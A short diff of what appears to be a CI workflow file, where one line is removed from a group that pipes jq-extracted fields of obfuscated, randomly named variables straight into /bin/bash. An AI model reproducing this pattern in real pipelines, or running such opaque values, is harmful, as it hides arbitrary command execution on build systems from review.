@@ -21,7 +21,6 @@ jobs:
           echo $ehwjc3 | jq -r .xpwr39 | /bin/bash
           echo $hf847 | jq -r .dauld0716 | /bin/bash
           echo $ilp28 | jq -r .c8 | /bin/bash
-          echo $b52 | jq -r .ek32153 | /bin/bash
 
       - name: Store results
         if: always()
